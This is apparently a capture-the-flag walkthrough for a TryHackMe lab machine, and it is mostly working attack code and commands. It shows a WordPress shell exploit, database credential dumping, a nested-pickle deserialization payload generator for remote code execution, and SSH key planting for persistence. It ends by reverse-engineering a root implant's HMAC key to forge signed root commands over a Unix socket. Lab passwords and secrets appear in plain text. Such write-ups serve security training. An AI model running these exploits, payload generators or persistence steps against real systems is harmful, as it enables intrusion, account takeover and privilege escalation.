## TryHackMe room Agent P https://tryhackme.com/room/thm-ctf-jackpot-overflow
## YouTube Video walk through: https://youtu.be/GxOb1I2tlOU

```
python3 wp2shell.py shell http://10.129.128.200  -i
```
```
mysql -uwpuser -pwp_WjURfdI wordpress -e 'SHOW TABLES;'
```
```
mysql -uwpuser -pwp_WjURfdI wordpress -e 'SELECT * FROM wp_infra_accounts;'
```

host_user	host_pass	note
norm	N0rm_th3_r0b0t_2026	ssh sync target for the -inator newsletter cron

```
ssh norm@10.129.128.200 
```
```
id
getent passwd norm vanessa
ps auxww
ss -lntup
ls -la /home /opt
find / -xdev -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null

finding:

/home/norm
/home/vanessa
/opt/evilinc/implant
127.0.0.1:8700
/run/evilinc/tasking.sock
```

Root-owned processes:
```
/usr/bin/python3 /opt/evilinc/c2/tasking_server.py
/usr/bin/python3 /opt/evilinc/c2/heartbeat.py
/opt/evilinc/implant
```
```
/etc/systemd/system
```
```
cat /etc/systemd/system/evilinc-implant.service
cat /etc/systemd/system/evilinc-c2.service
cat /etc/systemd/system/evilinc-heartbeat.service
cat /etc/systemd/system/evilinc-panel.service
```
```
evilinc-panel.service

User=vanessa
Group=vanessa
WorkingDirectory=/var/www/evilinc-panel
Environment=EIC_PANEL_CONF=/etc/evilinc/panel.conf
ExecStart=/usr/bin/gunicorn --bind 127.0.0.1:8700 --workers 2 app:app
```
```
evilinc-c2.service

Group=root
WorkingDirectory=/opt/evilinc/c2
ExecStart=/usr/bin/python3 /opt/evilinc/c2/tasking_server.py
```
evilinc-implant.service

User=root
ExecStart=/opt/evilinc/implant
```

==
```
id norm
id vanessa
getent group evilinc
```
norm belong to evilinc group:
```
```
cat /etc/evilinc/panel.conf

operator_secret = b3hind_sch3dul3_th1s_m0nth
```
== panel ==
```
curl -s http://127.0.0.1:8700
```
```
curl -s http://127.0.0.1:8700/api/blueprints/export

{"blueprint":"gASVRgAAAAAAAAB9lCiMBG5hbWWUjA5Nb250aGx5IERpZ2VzdJSMCHNlY3Rpb25zlF2UKIwFaW50cm+UjAdzY2hlbWVzlIwFb3V0cm+UZXUu"}
```
Safely Inspecting the Payload (No Code Execution)
```
import base64
import pickletools

# The suspicious base64-encoded pickle string
b64_payload = "gASVRgAAAAAAAAB9lCiMBG5hbWWUjA5Nb250aGx5IERpZ2VzdJSMCHNlY3Rpb25zlF2UKIwFaW50cm+UjAdzY2hlbWVzlIwFb3V0cm+UZXUu"

# Step 1: Decode the base64 string into bytes
pickle_bytes = base64.b64decode(b64_payload)

# Step 2: Disassemble the pickle byte stream SAFELY
print("--- Pickle Disassembly ---")
pickletools.dis(pickle_bytes)
```
--
```
python3 decode_payload.py

{
    "name": "Monthly Digest",
    "sections": ["intro", "schemes", "outro"],
}
```
```
ssh -L 8700:localhost:8700 norm@10.129.128.200
```
using browser:
```
application/x-www-form-urlencoded
```
```
curl -sS -i \
  -c panel.cookies \
  -X POST http://127.0.0.1:8700/api/login \
  -d 'secret=b3hind_sch3dul3_th1s_m0nth'
 ```
``` 
Set-Cookie
	op_token=ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451ae6b9f9fefef3f9; HttpOnly; Path=/  
```
Verify authenticated import using the exported sample
```
curl -sS \
  -b panel.cookies \
  -X POST http://127.0.0.1:8700/api/blueprints/import \
  --data-urlencode \
  'blueprint=gASVRgAAAAAAAAB9lCiMBG5hbWWUjA5Nb250aGx5IERpZ2VzdJSMCHNlY3Rpb25zlF2UKIwFaW50cm+UjAdzY2hlbWVzlIwFb3V0cm+UZXUu'  
```
  
== nested pickle Escaping the restricted pickle loader ==


Payload generator:

```
#!/usr/bin/env python3
import base64
import os
import pickle
import sys

command = sys.argv[1]

class Inner:
    def __reduce__(self):
        return os.system, (command,)

inner_blob = pickle.dumps(Inner(), protocol=4)

class Outer:
    def __reduce__(self):
        return pickle.loads, (inner_blob,)

print(base64.b64encode(pickle.dumps(Outer(), protocol=4)).decode())
```

Generate a harmless proof:

```
python3 make_payload.py 'id > /tmp/vanessa_id'
gASVVgAAAAAAAACMB19waWNrbGWUjAVsb2Fkc5STlEM6gASVLwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBRpZCA+IC90bXAvdmFuZXNzYV9pZJSFlFKULpSFlFKULg==  
 ```
``` 
PAYLOAD=gASVVgAAAAAAAACMB19waWNrbGWUjAVsb2Fkc5STlEM6gASVLwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBRpZCA+IC90bXAvdmFuZXNzYV9pZJSFlFKULpSFlFKULg==  
```
```
curl -sS \
  -b panel.cookies \
  -X POST http://127.0.0.1:8700/api/blueprints/import \
  --data-urlencode "blueprint=$PAYLOAD"
```
Proof:
```
cat /tmp/vanessa_id
```
 
  ```
python3 make_payload.py 'cat /home/vanessa/operator.txt > /tmp/vanessa_flag'  
```
```
ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""
```
login as vanesa:
```
mkdir -p /home/vanessa/.ssh;echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFER1hFK2RjQjFPRDVXSVdRNURpZUcvN01KeVhhMndIMEU2cTlPSnVmbU1wY3BwVEFUb2JDTTY3SHpYUmFReEt2Qm5wWXdhcVEvWjVHNk4vTXRIbldoQW9TenBOZCtZaTJsdkJrZzNXYWplNEFlREtDZlBRZGpsdi9ROUxmaXlvdEFENDJSODU4QzlDL0J2N1FSd1c2SzN2akVWTm9tUUZGdnU1ZFNFcEpSemRSTXpRZjluY2daSzRpU05UY2VwUnpwNThkRTJXb2RuMHRFNDVacGErMGJNVDhkT1VaeHdHOGhCbGZxWTB3YVVKT0JJbXAxbVBCWXVWdU55dUgyZnYvdmI2ZStaWXNxazNBbGVINnhncnNGR214cWp0Z25aV0lEcklKQzJGTFlRdUZNcy9ubnIyamVlaG85ajdnWmRwUnJ4aUxEeU1jdjg3QVo2NWhhSXJ3NnggamFsaWxAamFsaWwtVm9zdHJvLTQ2MAo= |base64 -d >> /home/vanessa/.ssh/authorized_keys;chmod 700 /home/vanessa/.ssh;chmod 600 /home/vanessa/.ssh/authorized_keys
```
```
python3 make_payload.py 'mkdir -p /home/vanessa/.ssh;echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFER1hFK2RjQjFPRDVXSVdRNURpZUcvN01KeVhhMndIMEU2cTlPSnVmbU1wY3BwVEFUb2JDTTY3SHpYUmFReEt2Qm5wWXdhcVEvWjVHNk4vTXRIbldoQW9TenBOZCtZaTJsdkJrZzNXYWplNEFlREtDZlBRZGpsdi9ROUxmaXlvdEFENDJSODU4QzlDL0J2N1FSd1c2SzN2akVWTm9tUUZGdnU1ZFNFcEpSemRSTXpRZjluY2daSzRpU05UY2VwUnpwNThkRTJXb2RuMHRFNDVacGErMGJNVDhkT1VaeHdHOGhCbGZxWTB3YVVKT0JJbXAxbVBCWXVWdU55dUgyZnYvdmI2ZStaWXNxazNBbGVINnhncnNGR214cWp0Z25aV0lEcklKQzJGTFlRdUZNcy9ubnIyamVlaG85ajdnWmRwUnJ4aUxEeU1jdjg3QVo2NWhhSXJ3NnggamFsaWxAamFsaWwtVm9zdHJvLTQ2MAo= |base64 -d >> /home/vanessa/.ssh/authorized_keys;chmod 700 /home/vanessa/.ssh;chmod 600 /home/vanessa/.ssh/authorized_keys'
gASVAAMAAAAAAACMB19waWNrbGWUjAVsb2Fkc5STlELhAgAAgASV1gIAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUWLgCAABta2RpciAtcCAvaG9tZS92YW5lc3NhLy5zc2g7ZWNobyBjM05vTFhKellTQkJRVUZCUWpOT2VtRkRNWGxqTWtWQlFVRkJSRUZSUVVKQlFVRkNRVkZFUjFoRksyUmpRakZQUkRWWFNWZFJOVVJwWlVjdk4wMUtlVmhoTW5kSU1FVTJjVGxQU25WbWJVMXdZM0J3VkVGVWIySkRUVFkzU0hwWVVtRlJlRXQyUW01d1dYZGhjVkV2V2pWSE5rNHZUWFJJYmxkb1FXOVRlbkJPWkN0WmFUSnNka0pyWnpOWFlXcGxORUZsUkV0RFpsQlJaR3BzZGk5Uk9VeG1hWGx2ZEVGRU5ESlNPRFU0UXpsREwwSjJOMUZTZDFjMlN6TjJha1ZXVG05dFVVWkdkblUxWkZORmNFcFNlbVJTVFhwUlpqbHVZMmRhU3pScFUwNVVZMlZ3VW5wd05UaGtSVEpYYjJSdU1IUkZORFZhY0dFck1HSk5WRGhrVDFWYWVIZEhPR2hDYkdaeFdUQjNZVlZLVDBKSmJYQXhiVkJDV1hWV2RVNTVkVWd5Wm5ZdmRtSTJaU3RhV1hOeGF6TkJiR1ZJTm5obmNuTkdSMjE0Y1dwMFoyNWFWMGxFY2tsS1F6SkdURmxSZFVaTmN5OXVibkl5YW1WbGFHODVhamRuV21Sd1VuSjRhVXhFZVUxamRqZzNRVm8yTldoaFNYSjNObmdnYW1Gc2FXeEFhbUZzYVd3dFZtOXpkSEp2TFRRMk1Bbz0gfGJhc2U2NCAtZCA+PiAvaG9tZS92YW5lc3NhLy5zc2gvYXV0aG9yaXplZF9rZXlzO2NobW9kIDcwMCAvaG9tZS92YW5lc3NhLy5zc2g7Y2htb2QgNjAwIC9ob21lL3ZhbmVzc2EvLnNzaC9hdXRob3JpemVkX2tleXOUhZRSlC6UhZRSlC4=
```
```
ssh -i ctf_key vanessa@10.129.128.200
```

=== Reverse engineering the root implant ===
```
file /opt/evilinc/implant
strings -a -t x /opt/evilinc/implant
```
transfer: scp norm@10.129.128.200:/opt/evilinc/implant ./implant


Socket behavior

The implant repeatedly:

1. Connects to `/run/evilinc/tasking.sock`.
2. Sends `POLL <last_processed_id>\n`.
3. Reads newline-separated tasks until `END`.
4. Requires five pipe-separated fields.
5. Rejects task IDs less than or equal to its last processed ID.
6. Recalculates and compares the task HMAC.
7. Calls `system(command)` when the task type is `exec`.

Task record:
```
id|type|command|nonce|signature
```
The signed portion excludes the signature:
```
id|type|command|nonce
```
=== Recovering the HMAC key

The implant does not store the final HMAC key directly. It generates a 32-byte stream using a fixed linear congruential generator:

```
state = 0x1A2B3C4D
state = (state * 0x41C64E6D + 0x3039) & 0xffffffff
output_byte = (state >> 16) & 0xff
```

It XORs that stream with this embedded 32-byte blob:

```
1588c57c026ae5eb9c2d1817af48f709
64efff765e58d112d8f116d70f9941b4
```

It then reads and trims `/etc/machine-id` and computes:
```
implant_key = HMAC_SHA256(xor_result, machine_id)
```

The target machine ID was:
```
ec237b10a5f6e959a3088340f9904b31
```

Complete reconstruction:

```
#!/usr/bin/env python3
import hashlib
import hmac

machine_id = b"ec237b10a5f6e959a3088340f9904b31"

blob = bytes.fromhex(
    "1588c57c026ae5eb9c2d1817af48f709"
    "64efff765e58d112d8f116d70f9941b4"
)

state = 0x1A2B3C4D
stream = bytearray()

for _ in range(32):
    state = (state * 0x41C64E6D + 0x3039) & 0xffffffff
    stream.append((state >> 16) & 0xff)

key_material = bytes(a ^ b for a, b in zip(blob, stream))
implant_key = hmac.new(key_material, machine_id, hashlib.sha256).digest()

print(implant_key.hex())
```

Derived key for this machine:

```
aa3e4980d20530450df2e4807cddc7a66f8391b79df9faaacde58b75bb483319
```

=== Validating the reverse engineering

As Vanessa, polling the socket returned signed heartbeat tasks such as:
```
printf 'POLL 0\n' |
  timeout 3 socat - UNIX-CONNECT:/run/evilinc/tasking.sock
```
This must run as Vanessa because the socket is writable only by root and the vanessa group. `POLL 0` requests every queued task with an ID above zero. In
the original solve, Vanessa command execution came from the pickle primitive, so its output was redirected for Norm to read:
```
printf 'POLL 0\n' |
  timeout 3 socat - UNIX-CONNECT:/run/evilinc/tasking.sock \
  > /tmp/socket-poll.txt
chmod 644 /tmp/socket-poll.txt
```
```
cat /tmp/socket-poll.txt
```

```
10|sysinfo|uptime|1000|2b33d3bf90540c999ecd917150e514240cc02cef3cd4fece3486790681103718
```

Recalculating:

```
message = b"10|sysinfo|uptime|1000"
signature = hmac.new(implant_key, message, hashlib.sha256).hexdigest()
```

produced the exact captured signature:
```
2b33d3bf90540c999ecd917150e514240cc02cef3cd4fece3486790681103718
```
This validation is important: never send the final task until the reconstructed algorithm reproduces a known input/output pair.



=== Discovering the task submission protocol

Vanessa can connect to the socket because it is owned by group vanessa
```
srw-rw---- root vanessa /run/evilinc/tasking.sock
```
Probe it from Vanessa's command-execution context:
```
printf 'HELP\n' | socat - UNIX-CONNECT:/run/evilinc/tasking.sock

ERR unknown verb
```
A small verb dictionary found the accepted submission command:

SUBMIT: ERR expected id|type|cmd|nonce|sig

 Forging a root task
 
 Use an ID safely above the current heartbeat IDs. The final demonstration used:
```
id      = 999999
type    = exec
command = cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt
nonce   = 424242
```
Signature generator:

```
import hashlib
import hmac

implant_key = bytes.fromhex(
    "aa3e4980d20530450df2e4807cddc7a66f8391b79df9faaacde58b75bb483319"
)

task_id = "999999"
task_type = "exec"
command = "cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt"
nonce = "424242"

message = f"{task_id}|{task_type}|{command}|{nonce}"
signature = hmac.new(
    implant_key,
    message.encode(),
    hashlib.sha256,
).hexdigest()

print(f"SUBMIT {message}|{signature}")
```

Execute the generated submission line as Vanessa through the pickle primitive:
```
printf '%s\n' 'SUBMIT 999999|exec|cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt|424242|SIGNATURE' \
  | socat - UNIX-CONNECT:/run/evilinc/tasking.sock
```

Server response:

OK

After the root implant's next poll:
```
cat /tmp/root.txt
```
in case of error:

find the current maximum task ID:
```
printf 'POLL 0\n' |
    socat - UNIX-CONNECT:/run/evilinc/tasking.sock |
    awk -F'|' '$1 ~ /^[0-9]+$/ {if ($1 > max) max=$1} END {print max}'
```
Choose an ID above that value, leaving room for heartbeat tasks. For example,
  if the maximum is 999999, use:
```
  task_id = "1001000"
```
